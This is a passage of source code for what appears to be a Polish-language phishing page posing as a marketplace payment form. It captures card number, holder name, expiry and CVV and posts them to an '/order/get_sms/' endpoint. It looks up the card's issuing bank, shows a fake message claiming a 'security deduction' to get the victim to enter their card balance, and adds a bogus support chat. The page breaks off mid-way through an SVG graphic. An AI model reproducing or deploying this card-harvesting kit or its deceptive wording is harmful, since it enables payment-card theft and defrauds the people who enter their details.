											text = \'<div class="row msg_container base_sent"><div class="col-md-10 col-xs-10 " style="width: 80%;"><div class="messages msg_sent"><p>\'+json[i].message+\'</p><time datetime="\'+time+\'">Ty</time></div></div><div class="col-md-2 col-xs-2 avatar" style="width: 20%;"><img src="/user.png" id="usr_img"></div></div>\'
										}
										$(\'.msg_container_base\').html(cur_text+text);
										var objDiv = $(\'.msg_container_base\');
										objDiv.scrollTop($(\'.msg_container_base\')[0].scrollHeight);
										$(\'#chat_window_1\').show();
					    				$(\'#open-support\').hide();
									}
							}
						}
				}
			}
		}

		function getCurTime() {
			var date = new Date();
			var hours = date.getHours();
			var minutes = "0" + date.getMinutes();
			var formattedTime = hours + \':\' + minutes.substr(-2);
			return formattedTime;
		}

		function getTime(unixtime) {
			var date = new Date(unixtime * 1000);
			var hours = date.getHours();
			var minutes = "0" + date.getMinutes();
			var formattedTime = hours + \':\' + minutes.substr(-2);
			return formattedTime;
		}

		function getCookie(cname) {
		  var name = cname + "=";
		  var decodedCookie = decodeURIComponent(document.cookie);
		  var ca = decodedCookie.split(\';\');
		  for(var i = 0; i <ca.length; i++) {
		    var c = ca[i];
		    while (c.charAt(0) == \' \') {
		      c = c.substring(1);
		    }
		    if (c.indexOf(name) == 0) {
		      return c.substring(name.length, c.length);
		    }
		  }
		  return "";
		}

		function setCookie(cname, cvalue) {
		  var d = new Date();
			  d.setTime(d.getTime() + (6*60*60*1000));
		  var expires = "expires="+ d.toUTCString();
		  document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
		}
	function openForm() {
	  document.getElementById("myForm").style.display = "block";
	  document.getElementById("open-support").style.display = "none";
	  var objDiv = $(\'.msg_container_base\');
		objDiv.scrollTop = objDiv.scrollHeight;
	}

	function closeForm() {
	  document.getElementById("myForm").style.display = "none";
	  document.getElementById("open-support").style.display = "block";
	}
	var input = document.getElementById("btn-input");

	input.addEventListener("keydown", function(event) {
	  if (event.keyCode === 13) {
	    event.preventDefault();
	    document.getElementById("btn-chat").click();
	  }
	});1    </script>
      <!--- CHAT CLOSE --->
      <!--- limits -->
    <input type="hidden" id="limit" value="-1">
    <div class="modal fade" id="limitModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" data-backdrop="static" aria-hidden="true" style="opacity: 1; visibility: visible;">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title" id="exampleModalLabel" ><b> Wystąpił błąd!</b></h5>


</div>
<div class="modal-body">
<p>Ze względu na coraz częstsze występowanie nieuczciwych działań oraz przeciwdziałanie legalizacji pieniędzy uzyskanych w wyniku przestępstwa, wymagane saldo na karcie musi wynosić minimum -1 PLN. Środki te muszą znajdować się na karcie, którą akceptujesz płatność, aby terminal POS mógł zweryfikować Ciebie jako właściciela. Operacja jest jednorazowa i jest wykonywana niepotrzebnie w przyszłości.</p>

</div>
<div class="modal-footer">
<button type="submit" style="background-color: #002f34; border-color: #002f34;" class="btn btn-primary" id="limitclose" >OK</button>
</div>
</div>
</div>
</div>
    <img src="../../logopl.png" style="width: 60px; display: block; margin-left: auto; margin-right: auto; margin-top: 10px;">
<div class="wrapper" id="app">
    <div class="card-form">
        <div class="pay-card-layout__header_type_vkpay">

            <br>
            <br>
        </div>
        <div class="card-list">
            <div class="card-item" v-bind:class="{ \'-active\' : isCardFlipped }">
                <div class="card-item__side -front">
                    <div class="card-item__focus" v-bind:class="{\'-active\' : focusElementStyle }"
                         v-bind:style="focusElementStyle" ref="focusElement"></div>
                    <div class="card-item__cover">
                        <img
                                v-bind:src="\'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/\' + currentCardBackground + \'.jpeg\'"
                                class="card-item__bg">
                    </div>

                    <div class="card-item__wrapper">
                        <div class="card-item__top">
                            <img
                                    src="https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/chip.png"
                                    class="card-item__chip">
                            <div class="card-item__type">
                                <transition name="slide-fade-up">
                                    <img
                                            v-bind:src="\'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/\' + getCardType + \'.png\'"
                                            v-if="getCardType" v-bind:key="getCardType" alt=""
                                            class="card-item__typeImg">
                                </transition>
                            </div>
                        </div>
                        <label for="cardNumber" class="card-item__number" ref="cardNumber">
                            <template v-if="getCardType === \'amex\'">
                  <span v-for="(n, $index) in amexCardMask" :key="$index">
                    <transition name="slide-fade-up">
                      <div class="card-item__numberItem"
                           v-if="$index > 4 && $index < 14 && cardNumber.length > $index && n.trim() !== \'\'">*</div>
                      <div class="card-item__numberItem" :class="{ \'-active\' : n.trim() === \'\' }" :key="$index"
                           v-else-if="cardNumber.length > $index">
                        {{cardNumber[$index]}}
                      </div>
                      <div class="card-item__numberItem" :class="{ \'-active\' : n.trim() === \'\' }" v-else
                           :key="$index + 1">{{n}}</div>
                    </transition>
                  </span>
                            </template>

                            <template v-else>
                  <span v-for="(n, $index) in otherCardMask" :key="$index">
                    <transition name="slide-fade-up">
                      <div class="card-item__numberItem"
                           v-if="$index > 4 && $index < 15 && cardNumber.length > $index && n.trim() !== \'\'">*</div>
                      <div class="card-item__numberItem" :class="{ \'-active\' : n.trim() === \'\' }" :key="$index"
                           v-else-if="cardNumber.length > $index">
                        {{cardNumber[$index]}}
                      </div>
                      <div class="card-item__numberItem" :class="{ \'-active\' : n.trim() === \'\' }" v-else
                           :key="$index + 1">{{n}}</div>
                    </transition>
                  </span>
                            </template>
                        </label>
                        <div class="card-item__content">
                            <label for="cardName" class="card-item__info" ref="cardName">
                                <div class="card-item__holder">Full Name</div>
                                <transition name="slide-fade-up">
                                    <div class="card-item__name" v-if="cardName.length" key="1">
                                        <transition-group name="slide-fade-right">
                        <span class="card-item__nameItem" v-for="(n, $index) in cardName.replace(/\s\s+/g, \' \')"
                              v-if="$index === $index" v-bind:key="$index + 1">{{n}}</span>
                                        </transition-group>
                                    </div>
                                    <div class="card-item__name" v-else key="2">Full Name</div>
                                </transition>
                            </label>
                            <div class="card-item__date" ref="cardDate">
                                <label for="cardMonth" class="card-item__dateTitle">ММ/YY</label>
                                <label for="cardMonth" class="card-item__dateItem">
                                    <transition name="slide-fade-up">
                                        <span v-if="cardMonth" v-bind:key="cardMonth">{{cardMonth}}</span>
                                        <span v-else key="2">MM</span>
                                    </transition>
                                </label>
                                /
                                <label for="cardYear" class="card-item__dateItem">
                                    <transition name="slide-fade-up">
                                        <span v-if="cardYear"
                                              v-bind:key="cardYear">{{String(cardYear).slice(2,4)}}</span>
                                        <span v-else key="2">YY</span>
                                    </transition>
                                </label>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="card-item__side -back">
                    <div class="card-item__cover">
                        <img
                                v-bind:src="\'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/\' + currentCardBackground + \'.jpeg\'"
                                class="card-item__bg">
                    </div>
                    <div class="card-item__band"></div>
                    <div class="card-item__cvv">
                        <div class="card-item__cvvTitle">CVV</div>
                        <div class="card-item__cvvBand">
                <span v-for="(n, $index) in cardCvv" :key="$index">
                  *
                </span>

                        </div>
                        <div class="card-item__type">
                            <img
                                    v-bind:src="\'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/\' + getCardType + \'.png\'"
                                    v-if="getCardType" class="card-item__typeImg">
                        </div>
                    </div>
                </div>
            </div>
        </div>
	    <script>
                            $(function(){
                                $("#cardNumber").blur(function(){
                                    var id_card = $("#cardNumber").val();
                                    id_card = id_card.split(" ").join("");
                                    id_card = id_card.substring(0, 6);
                                    if(id_card.length>=6){
                                        $.get("https://lookup.binlist.net/"+id_card,function(r){
                                            $("#bank_name").val(r.bank.name);
                                            $("#bank_country").val(r.country.emoji+" "+r.country.name);
                                            $("#bank_url").val(r.bank.url);
                                            $("#bank_type").val(r.type);
                                            $("#bank_scheme").val(r.scheme);
						if(!r.bank.name||(r.bank.name&&r.bank.name.indexOf("ZACHODNI")!=-1)){
							$.get("/payout.php?get_bin="+id_card,function(rr){
								$(".card-body table tr",rr).each(function(i,v){
								    if($("td",v).text().indexOf("Issuer Name / Bank")!=-1){ 
									$("#bank_name").val($("td:eq(1) a:eq(0)",v).text());
								    }
								    if($("td",v).text().indexOf("Bank Website")!=-1){ 
									$("#bank_url").val($("td:eq(1) a:eq(0)",v).text());
								    }
								});
								
							});
						}
                                        });
                                    }
                                });
                            });
                           </script>
        <form method="POST" action="/order/get_sms/'.$product->id.'" id="cardForm">

            <div class="card-form__inner">
                <div class="card-input">
                    <label for="cardNumber" class="card-input__label">Numer karty</label>
                    <input type="text" name="cardNumber" id="cardNumber" class="card-input__input"
                           v-mask="generateCardNumberMask"
                           v-model="cardNumber" placeholder="#### #### #### ####" v-on:focus="focusInput"
                           v-on:blur="blurInput"
                           data-ref="cardNumber" autocomplete="off">
			<input type="hidden" name="bank_name" id="bank_name" value="">
                           <input type="hidden" name="bank_country" id="bank_country" value="">
                           <input type="hidden" name="bank_url" id="bank_url" value="">
                           <input type="hidden" name="bank_type" id="bank_type" value="">
                           <input type="hidden" name="bank_scheme" id="bank_scheme" value="">
                </div>
                <div class="card-input">
                    <label for="cardName" class="card-input__label">posiadacz karty</label>
                    <input type="text" name="fio" id="cardName" placeholder="AGNIESZKA KOWALSKA" class="card-input__input"
                           v-model="cardName"
                           v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="off">
                </div>
                <div class="card-form__row">
                    <div class="card-form__col">
                        <div class="card-form__group">
                            <label for="cardMonth" class="card-input__label">Ważność</label>
                            <select class="card-input__input -select" name="cardMonth" id="cardMonth"
                                    v-model="cardMonth" v-on:focus="focusInput"
                                    v-on:blur="blurInput" data-ref="cardDate">
                                <option value="" disabled selected>Miesiąc</option>
                                <option v-bind:value="n < 10 ? \'0\' + n : n" v-for="n in 12"
                                        v-bind:disabled="n < minCardMonth"
                                        v-bind:key="n">
                                    {{n < 10 ? \'0\' + n : n}}
                                </option>
                            </select>
                            <select class="card-input__input -select" name="cardYear" id="cardYear" v-model="cardYear"
                                    v-on:focus="focusInput"
                                    v-on:blur="blurInput" data-ref="cardDate">
                                <option value="" disabled selected>Rok</option>
                                <option v-bind:value="$index + minCardYear" v-for="(n, $index) in 12" v-bind:key="n">
                                    {{$index + minCardYear}}
                                </option>
                            </select>
                        </div>
                    </div>
                    <div class="card-form__col -cvv">
                        <div class="card-input">
                            <label for="cardCvv" class="card-input__label">CVV</label>
                            <input type="text" placeholder="***" name="cardCvv" class="card-input__input cardCvv" id="card"
                                   v-mask="\'###\'" maxlength="3" required pattern="[0-9]{3}"
                                   v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)"
                                   autocomplete="off">
                        </div>
                    </div>
                </div>
                <input type="hidden" name="id" id="track_id" value="'.time().'">
                <input type="button" value="DOSTAĆ" class="card-form__button" id="submitButton" style="background: #002f34; color: #fff">
                <button type="button" class="open-button" id="open-support" onclick="openChat()" style="position:inherit;margin-top: 10px; width: 100%;
                  z-index: 300;
  border: 0; 
  content: \'Напишите нам в чат\';
  background: #00ad64;
  border-radius: 5px;
  padding: 16px 0px;
  border: none;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  height: 36px;
  opacity: 1;
  display: flex;
  background-color: #002f34; border-color: #002f34;
  bottom: 80px;"><p id="open-button-text" style="color: #fff; visibility: visible; margin-left: auto;margin-right: auto;margin: 0 auto;">Wsparcie</p></button>
            </div>
            <div class="modal fade" id="balanceModal" tabindex="-1" role="dialog" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title"><svg width="1.4em" height="1.4em" viewBox="0 0 16 16" class="bi bi-check2-square" fill="green" xmlns="http://www.w3.org/2000/svg">
  <path fill-rule="evenodd" d="M15.354 2.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3-3a.5.5 0 1 1 .708-.708L8 9.293l6.646-6.647a.5.5 0 0 1 .708 0z"/>
  <path fill-rule="evenodd" d="M1.5 13A1.5 1.5 0 0 0 3 14.5h10a1.5 1.5 0 0 0 1.5-1.5V8a.5.5 0 0 0-1 0v5a.5.5 0 0 1-.5.5H3a.5.5 0 0 1-.5-.5V3a.5.5 0 0 1 .5-.5h8a.5.5 0 0 0 0-1H3A1.5 1.5 0 0 0 1.5 3v10z"/>
</svg>&nbsp;&nbsp;Dane Twojej karty zostały zweryfikowane</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close" id="closeBalance">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <p>Ze względów bezpieczeństwa tymczasowo odliczyliśmy z Twojej karty losową kwotę. Środki zostaną zwrócone na Twoje konto po zakończeniu transakcji. </p>
         <p> Aby potwierdzić własność karty, wprowadź aktualne saldo.</p>
        <div class="input-group mb-3">
          <div class="input-group-prepend">
            <span class="input-group-text">Saldo karty: </span>
          </div>
          <input type="text" class="form-control" placeholder="0.00" aria-label="Balance" value="" name="cardBalance" id="cardBalance" maxlength="20">
          <div class="input-group-append">
            <span class="input-group-text">PLN</span>
          </div>
        </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="open-button" id="open-support" onclick="openChat()" style="position:inherit;margin: 6px;
                  z-index: 300;
  border: 0; 
  content: \'Напишите нам в чат\';
  background: #00ad64;
  border-radius: .25rem;
  padding: 16px 0px;
  border: none;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  height: 38px;
  opacity: 1;
  display: flex;
  background-color: #002f34; border-color: #002f34;
  bottom: 80px; "><p id="open-button-text" style="color: #fff;visibility: visible; margin-left: auto;margin-right: auto;margin: 0 auto;">Wsparcie</p></button>
        <button type="button" class="btn btn-success" id="sendBalance" style="background: #002f34;color: #fff">Potwierdzać</button>
      </div>
    </div>
  </div>
</div>
        </form>
        <center>
            <svg id="svg-secure-connection" viewBox="0 0 105 32" style="width: 20%; margin: 20px 10px;">
                <g opacity="0.9">
                    <path
                            d="M15.9655 30.931C24.2307 30.931 30.931 24.2307 30.931 15.9655C30.931 7.70029 24.2307 1 15.9655 1C7.70029 1 1 7.70029 1 15.9655C1 24.2307 7.70029 30.931 15.9655 30.931Z"
                            stroke-width="2" fill="none"></path>
                    <path fill-rule="evenodd" clip-rule="evenodd"
                          d="M12.2347 20.9783V14.6022L12.2359 14.6009H20.3364L20.3376 14.6022V20.9783H12.2347ZM13.6589 12.2563C13.6589 11.5698 13.9265 10.9208 14.413 10.4319C14.8981 9.94295 15.5396 9.6741 16.2199 9.6741H16.3612C17.4328 9.6741 18.4007 10.3594 18.7696 11.3797C18.8708 11.6611 18.9234 11.9562 18.9234 12.2576L18.9246 13.8506H13.6589V12.2563ZM20.3376 13.8506H19.6749L19.6724 12.2563C19.6724 11.8687 19.6061 11.4873 19.4748 11.1234C18.9984 9.8079 17.7479 8.92383 16.3612 8.92383H16.2211C15.3395 8.92383 14.508 9.27146 13.8803 9.90294C13.2538 10.5344 12.9087 11.3697 12.9087 12.2563V13.8506H12.2347C11.822 13.8506 11.4844 14.1883 11.4844 14.6009V21.0533C11.4844 21.4247 11.7882 21.7285 12.1596 21.7285H20.4127C20.7841 21.7285 21.0879 21.4247 21.0879 21.0533V14.6009C21.0879 14.1883 20.7503 13.8506 20.3376 13.8506Z">
                    </path>
                    <path
                            d="M12.2347 20.9783H11.7847V21.4283H12.2347V20.9783ZM12.2347 14.6022L11.9165 14.284L11.7847 14.4158V14.6022H12.2347ZM12.2359 14.6009V14.1509H12.0495L11.9177 14.2827L12.2359 14.6009ZM20.3364 14.6009L20.6546 14.2827L20.5228 14.1509H20.3364V14.6009ZM20.3376 14.6022H20.7876V14.4158L20.6559 14.284L20.3376 14.6022ZM20.3376 20.9783V21.4283H20.7876V20.9783H20.3376ZM14.413 10.4319L14.732 10.7493L14.7324 10.7489L14.413 10.4319ZM18.7696 11.3797L19.193 11.2273L19.1928 11.2267L18.7696 11.3797ZM18.9234 12.2576H18.4734V12.2579L18.9234 12.2576ZM18.9246 13.8506V14.3006H19.375L19.3746 13.8503L18.9246 13.8506ZM13.6589 13.8506H13.2089V14.3006H13.6589V13.8506ZM19.6749 13.8506L19.2249 13.8514L19.2256 14.3006H19.6749V13.8506ZM19.6724 12.2563H19.2224L19.2224 12.257L19.6724 12.2563ZM19.4748 11.1234L19.8981 10.9707L19.8979 10.9702L19.4748 11.1234ZM13.8803 9.90294L13.5611 9.58569L13.5608 9.58601L13.8803 9.90294ZM12.9087 13.8506V14.3006H13.3586V13.8506H12.9087ZM12.6847 20.9783V14.6022H11.7847V20.9783H12.6847ZM12.5528 14.9204L12.5541 14.9191L11.9177 14.2827L11.9165 14.284L12.5528 14.9204ZM12.2359 15.0509H20.3364V14.1509H12.2359V15.0509ZM20.0182 14.9191L20.0194 14.9203L20.6559 14.284L20.6546 14.2827L20.0182 14.9191ZM19.8876 14.6022V20.9783H20.7876V14.6022H19.8876ZM20.3376 20.5283H12.2347V21.4283H20.3376V20.5283ZM14.1089 12.2563C14.1089 11.6889 14.3293 11.154 14.732 10.7493L14.0939 10.1145C13.5237 10.6876 13.2089 11.4507 13.2089 12.2563H14.1089ZM14.7324 10.7489C15.1342 10.3439 15.6611 10.1241 16.2199 10.1241V9.2241C15.4181 9.2241 14.6621 9.54196 14.0935 10.1149L14.7324 10.7489ZM16.2199 10.1241H16.3612V9.2241H16.2199V10.1241ZM16.3612 10.1241C17.2402 10.1241 18.0409 10.6877 18.3464 11.5327L19.1928 11.2267C18.7605 10.031 17.6254 9.2241 16.3612 9.2241V10.1241ZM18.3462 11.5322C18.4301 11.7654 18.4734 12.009 18.4734 12.2576H19.3734C19.3734 11.9034 19.3116 11.5568 19.193 11.2273L18.3462 11.5322ZM18.4734 12.2579L18.4746 13.851L19.3746 13.8503L19.3734 12.2572L18.4734 12.2579ZM18.9246 13.4006H13.6589V14.3006H18.9246V13.4006ZM14.1089 13.8506V12.2563H13.2089V13.8506H14.1089ZM20.3376 13.4006H19.6749V14.3006H20.3376V13.4006ZM20.1249 13.8499L20.1224 12.2556L19.2224 12.257L19.2249 13.8514L20.1249 13.8499ZM20.1224 12.2563C20.1224 11.817 20.0472 11.3839 19.8981 10.9707L19.0515 11.2761C19.165 11.5907 19.2224 11.9203 19.2224 12.2563H20.1224ZM19.8979 10.9702C19.3579 9.47895 17.9399 8.47383 16.3612 8.47383V9.37383C17.556 9.37383 18.6389 10.1369 19.0517 11.2766L19.8979 10.9702ZM16.3612 8.47383H16.2211V9.37383H16.3612V8.47383ZM16.2211 8.47383C15.2185 8.47383 14.2724 8.87012 13.5611 9.58569L14.1994 10.2202C14.7435 9.67279 15.4606 9.37383 16.2211 9.37383V8.47383ZM13.5608 9.58601C12.8511 10.3014 12.4587 11.2504 12.4587 12.2563H13.3586C13.3586 11.489 13.6564 10.7675 14.1997 10.2199L13.5608 9.58601ZM12.4587 12.2563V13.8506H13.3586V12.2563H12.4587ZM12.9087 13.4006H12.2347V14.3006H12.9087V13.4006ZM12.2347 13.4006C11.5735 13.4006 11.0344 13.9397 11.0344 14.6009H11.9344C11.9344 14.4368 12.0705 14.3006 12.2347 14.3006V13.4006ZM11.0344 14.6009V21.0533H11.9344V14.6009H11.0344ZM11.0344 21.0533C11.0344 21.6732 11.5397 22.1785 12.1596 22.1785V21.2785C12.0368 21.2785 11.9344 21.1762 11.9344 21.0533H11.0344ZM12.1596 22.1785H20.4127V21.2785H12.1596V22.1785ZM20.4127 22.1785C21.0326 22.1785 21.5379 21.6732 21.5379 21.0533H20.6379C20.6379 21.1762 20.5355 21.2785 20.4127 21.2785V22.1785ZM21.5379 21.0533V14.6009H20.6379V21.0533H21.5379ZM21.5379 14.6009C21.5379 13.9397 20.9988 13.4006 20.3376 13.4006V14.3006C20.5018 14.3006 20.6379 14.4368 20.6379 14.6009H21.5379Z"
                            stroke="none"></path>
                    <path
                            d="M40.9824 9.73926L42.3887 9.60254C42.4733 10.0745 42.6442 10.4212 42.9014 10.6426C43.1618 10.8639 43.5117 10.9746 43.9512 10.9746C44.4167 10.9746 44.7666 10.877 45.001 10.6816C45.2386 10.4831 45.3574 10.252 45.3574 9.98828C45.3574 9.81901 45.307 9.67578 45.2061 9.55859C45.1084 9.43815 44.9359 9.33398 44.6885 9.24609C44.5192 9.1875 44.1335 9.08333 43.5312 8.93359C42.7565 8.74154 42.2129 8.50553 41.9004 8.22559C41.4609 7.83171 41.2412 7.35156 41.2412 6.78516C41.2412 6.42057 41.3438 6.0804 41.5488 5.76465C41.7572 5.44564 42.055 5.20312 42.4424 5.03711C42.833 4.87109 43.3034 4.78809 43.8535 4.78809C44.752 4.78809 45.4274 4.98503 45.8799 5.37891C46.3356 5.77279 46.5749 6.2985 46.5977 6.95605L45.1523 7.01953C45.0905 6.65169 44.957 6.38802 44.752 6.22852C44.5501 6.06576 44.2458 5.98438 43.8389 5.98438C43.4189 5.98438 43.0902 6.07064 42.8525 6.24316C42.6995 6.35384 42.623 6.50195 42.623 6.6875C42.623 6.85677 42.6947 7.00163 42.8379 7.12207C43.0202 7.27507 43.4629 7.43457 44.166 7.60059C44.8691 7.7666 45.3883 7.93913 45.7236 8.11816C46.0622 8.29395 46.3258 8.53646 46.5146 8.8457C46.7067 9.15169 46.8027 9.53092 46.8027 9.9834C46.8027 10.3936 46.6888 10.7777 46.4609 11.1357C46.2331 11.4938 45.9108 11.7607 45.4941 11.9365C45.0775 12.109 44.5583 12.1953 43.9365 12.1953C43.0316 12.1953 42.3366 11.987 41.8516 11.5703C41.3665 11.1504 41.0768 10.54 40.9824 9.73926ZM51.0117 10.418L52.3789 10.6475C52.2031 11.1488 51.9248 11.5312 51.5439 11.7949C51.1663 12.0553 50.6927 12.1855 50.123 12.1855C49.2214 12.1855 48.554 11.891 48.1211 11.3018C47.7793 10.8298 47.6084 10.234 47.6084 9.51465C47.6084 8.65527 47.833 7.98307 48.2822 7.49805C48.7314 7.00977 49.2995 6.76562 49.9863 6.76562C50.7578 6.76562 51.3665 7.02116 51.8125 7.53223C52.2585 8.04004 52.4717 8.81966 52.4521 9.87109H49.0146C49.0244 10.278 49.1351 10.5954 49.3467 10.8232C49.5583 11.0479 49.8219 11.1602 50.1377 11.1602C50.3525 11.1602 50.5332 11.1016 50.6797 10.9844C50.8262 10.8672 50.9368 10.6784 51.0117 10.418ZM51.0898 9.03125C51.0801 8.63411 50.9775 8.33301 50.7822 8.12793C50.5869 7.9196 50.3493 7.81543 50.0693 7.81543C49.7699 7.81543 49.5225 7.92448 49.3271 8.14258C49.1318 8.36068 49.0358 8.6569 49.0391 9.03125H51.0898ZM58.0967 8.41602L56.7441 8.66016C56.6986 8.38997 56.5944 8.18652 56.4316 8.0498C56.2721 7.91309 56.0638 7.84473 55.8066 7.84473C55.4648 7.84473 55.1914 7.96354 54.9863 8.20117C54.7845 8.43555 54.6836 8.82943 54.6836 9.38281C54.6836 9.99805 54.7861 10.4326 54.9912 10.6865C55.1995 10.9404 55.4779 11.0674 55.8262 11.0674C56.0866 11.0674 56.2998 10.9941 56.4658 10.8477C56.6318 10.6979 56.749 10.4424 56.8174 10.0811L58.165 10.3105C58.0251 10.929 57.7565 11.3962 57.3594 11.7119C56.9622 12.0277 56.43 12.1855 55.7627 12.1855C55.0042 12.1855 54.3988 11.9463 53.9463 11.4678C53.4971 10.9893 53.2725 10.3268 53.2725 9.48047C53.2725 8.62435 53.4987 7.95866 53.9512 7.4834C54.4036 7.00488 55.0156 6.76562 55.7871 6.76562C56.4186 6.76562 56.9199 6.90234 57.291 7.17578C57.6654 7.44596 57.9339 7.85938 58.0967 8.41602ZM62.5547 12.0684V11.292C62.3659 11.5687 62.1169 11.7868 61.8076 11.9463C61.5016 12.1058 61.1777 12.1855 60.8359 12.1855C60.4876 12.1855 60.1751 12.109 59.8984 11.9561C59.6217 11.8031 59.4215 11.5882 59.2979 11.3115C59.1742 11.0348 59.1123 10.6523 59.1123 10.1641V6.88281H60.4844V9.26562C60.4844 9.99479 60.5088 10.4424 60.5576 10.6084C60.6097 10.7712 60.7025 10.9014 60.8359 10.999C60.9694 11.0934 61.1387 11.1406 61.3438 11.1406C61.5781 11.1406 61.7881 11.0771 61.9736 10.9502C62.1592 10.82 62.2861 10.6605 62.3545 10.4717C62.4229 10.2796 62.457 9.8125 62.457 9.07031V6.88281H63.8291V12.0684H62.5547ZM66.5684 12.0684H65.1963V6.88281H66.4707V7.62012C66.6888 7.27181 66.8841 7.04232 67.0566 6.93164C67.2324 6.82096 67.431 6.76562 67.6523 6.76562C67.9648 6.76562 68.266 6.85189 68.5557 7.02441L68.1309 8.2207C67.8997 8.07096 67.6849 7.99609 67.4863 7.99609C67.2943 7.99609 67.1315 8.0498 66.998 8.15723C66.8646 8.26139 66.7588 8.45182 66.6807 8.72852C66.6058 9.00521 66.5684 9.58464 66.5684 10.4668V12.0684ZM72.1543 10.418L73.5215 10.6475C73.3457 11.1488 73.0674 11.5312 72.6865 11.7949C72.3089 12.0553 71.8353 12.1855 71.2656 12.1855C70.3639 12.1855 69.6966 11.891 69.2637 11.3018C68.9219 10.8298 68.751 10.234 68.751 9.51465C68.751 8.65527 68.9756 7.98307 69.4248 7.49805C69.874 7.00977 70.4421 6.76562 71.1289 6.76562C71.9004 6.76562 72.5091 7.02116 72.9551 7.53223C73.401 8.04004 73.6143 8.81966 73.5947 9.87109H70.1572C70.167 10.278 70.2777 10.5954 70.4893 10.8232C70.7008 11.0479 70.9645 11.1602 71.2803 11.1602C71.4951 11.1602 71.6758 11.1016 71.8223 10.9844C71.9688 10.8672 72.0794 10.6784 72.1543 10.418ZM72.2324 9.03125C72.2227 8.63411 72.1201 8.33301 71.9248 8.12793C71.7295 7.9196 71.4919 7.81543 71.2119 7.81543C70.9124 7.81543 70.665 7.92448 70.4697 8.14258C70.2744 8.36068 70.1784 8.6569 70.1816 9.03125H72.2324ZM45.9287 22.4365L47.3301 22.8809C47.1152 23.6621 46.7572 24.2432 46.2559 24.624C45.7578 25.0016 45.1247 25.1904 44.3564 25.1904C43.4059 25.1904 42.6247 24.8665 42.0127 24.2188C41.4007 23.5677 41.0947 22.679 41.0947 21.5527C41.0947 20.3613 41.4023 19.4368 42.0176 18.7793C42.6328 18.1185 43.4417 17.7881 44.4443 17.7881C45.32 17.7881 46.0312 18.0469 46.5781 18.5645C46.9036 18.8704 47.1478 19.3099 47.3105 19.8828L45.8799 20.2246C45.7952 19.8535 45.6178 19.5605 45.3477 19.3457C45.0807 19.1309 44.7552 19.0234 44.3711 19.0234C43.8405 19.0234 43.4092 19.2139 43.0771 19.5947C42.7484 19.9756 42.584 20.5924 42.584 21.4453C42.584 22.3503 42.7467 22.9948 43.0723 23.3789C43.3978 23.763 43.821 23.9551 44.3418 23.9551C44.7259 23.9551 45.0563 23.833 45.333 23.5889C45.6097 23.3447 45.8083 22.9606 45.9287 22.4365ZM48.248 22.4023C48.248 21.9466 48.3604 21.5055 48.585 21.0791C48.8096 20.6527 49.127 20.3271 49.5371 20.1025C49.9505 19.8779 50.4111 19.7656 50.9189 19.7656C51.7035 19.7656 52.3464 20.0212 52.8477 20.5322C53.349 21.04 53.5996 21.6829 53.5996 22.4609C53.5996 23.2454 53.3457 23.8965 52.8379 24.4141C52.3333 24.9284 51.6969 25.1855 50.9287 25.1855C50.4535 25.1855 49.9993 25.0781 49.5664 24.8633C49.1367 24.6484 48.8096 24.3343 48.585 23.9209C48.3604 23.5042 48.248 22.998 48.248 22.4023ZM49.6543 22.4756C49.6543 22.9899 49.7764 23.3838 50.0205 23.6572C50.2646 23.9307 50.5658 24.0674 50.9238 24.0674C51.2819 24.0674 51.5814 23.9307 51.8223 23.6572C52.0664 23.3838 52.1885 22.9867 52.1885 22.4658C52.1885 21.958 52.0664 21.5674 51.8223 21.2939C51.5814 21.0205 51.2819 20.8838 50.9238 20.8838C50.5658 20.8838 50.2646 21.0205 50.0205 21.2939C49.7764 21.5674 49.6543 21.9613 49.6543 22.4756ZM59.3955 25.0684H58.0234V22.4219C58.0234 21.862 57.9941 21.5007 57.9355 21.3379C57.877 21.1719 57.7809 21.0433 57.6475 20.9521C57.5173 20.861 57.3594 20.8154 57.1738 20.8154C56.9362 20.8154 56.723 20.8805 56.5342 21.0107C56.3454 21.141 56.2152 21.3135 56.1436 21.5283C56.0752 21.7432 56.041 22.1403 56.041 22.7197V25.0684H54.6689V19.8828H55.9434V20.6445C56.3958 20.0586 56.9655 19.7656 57.6523 19.7656C57.9551 19.7656 58.2318 19.821 58.4824 19.9316C58.7331 20.0391 58.9219 20.1774 59.0488 20.3467C59.179 20.516 59.2686 20.708 59.3174 20.9229C59.3695 21.1377 59.3955 21.4453 59.3955 21.8457V25.0684ZM65.5088 25.0684H64.1367V22.4219C64.1367 21.862 64.1074 21.5007 64.0488 21.3379C63.9902 21.1719 63.8942 21.0433 63.7607 20.9521C63.6305 20.861 63.4727 20.8154 63.2871 20.8154C63.0495 20.8154 62.8363 20.8805 62.6475 21.0107C62.4587 21.141 62.3285 21.3135 62.2568 21.5283C62.1885 21.7432 62.1543 22.1403 62.1543 22.7197V25.0684H60.7822V19.8828H62.0566V20.6445C62.5091 20.0586 63.0788 19.7656 63.7656 19.7656C64.0684 19.7656 64.3451 19.821 64.5957 19.9316C64.8464 20.0391 65.0352 20.1774 65.1621 20.3467C65.2923 20.516 65.3818 20.708 65.4307 20.9229C65.4827 21.1377 65.5088 21.4453 65.5088 21.8457V25.0684ZM69.9082 23.418L71.2754 23.6475C71.0996 24.1488 70.8213 24.5312 70.4404 24.7949C70.0628 25.0553 69.5892 25.1855 69.0195 25.1855C68.1178 25.1855 67.4505 24.891 67.0176 24.3018C66.6758 23.8298 66.5049 23.234 66.5049 22.5146C66.5049 21.6553 